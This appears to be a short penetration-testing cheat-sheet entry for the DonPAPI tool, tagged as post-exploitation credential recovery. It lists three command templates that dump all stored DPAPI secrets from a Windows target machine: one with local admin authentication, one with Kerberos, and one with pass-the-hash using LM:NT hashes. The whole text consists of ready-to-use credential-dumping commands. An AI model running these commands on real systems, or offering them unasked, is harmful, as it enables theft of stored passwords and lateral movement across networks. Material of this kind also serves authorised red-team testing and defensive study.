# DonPAPI

% DonPAPI, dpapi

## DonPAPI - Dump all secrets of the target machine with Local Admin
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 

```
DonPAPI -local_auth <user>@<target>
```

## DonPAPI - Dump all secrets of the target machine with Local Admin (kerberos)
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 

```
DonPAPI -k <domain><user>@<target>
```

## DonPAPI - Dump all secrets of the target machine with Local Admin (pth)
#plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 

```
DonPAPI --hashes <LM>:<NT> <domain><user>@<target>
```